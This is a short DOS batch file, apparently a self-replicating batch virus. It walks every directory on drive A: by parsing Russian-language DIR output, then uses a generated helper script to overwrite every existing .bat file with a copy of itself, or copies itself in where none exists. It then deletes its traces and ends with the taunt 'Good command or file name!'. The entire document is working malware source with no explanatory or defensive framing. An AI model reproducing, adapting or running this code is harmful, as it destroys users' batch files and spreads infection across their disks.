@echo off
SET BN=Содержимое
SET ST="каталога"
set DD=A:
if not exist %DD%\*.* goto :END
%DD%
cd \
dir %0 /s | find /i %ST% > %DD%\V.666
echo exit >> %DD%\V.666
echo copy %%2\%0 %DD%\ > %DD%\%BN%.bat
command <  V.666  > nul
dir /ad /s | find /i %ST% > V.666
echo exit >> V.666
echo cd %%2 > %DD%\%BN%.bat
echo if exist %BN%.bat goto :END >> %DD%\%BN%.bat
echo if exist *.bat for %%%%F in (*.bat) do copy %DD%\%0 %%%%F >> %DD%\%BN%.bat
echo if not exist *.bat copy %DD%\%0 %%2 >> %DD%\%BN%.bat
echo :END >> %DD%\%BN%.bat
echo cd \ >> %DD%\%BN%.bat
command < V.666 > nul
del V.666
del %BN%.bat
del %DD%\%0
:END
@echo Good command or file name!
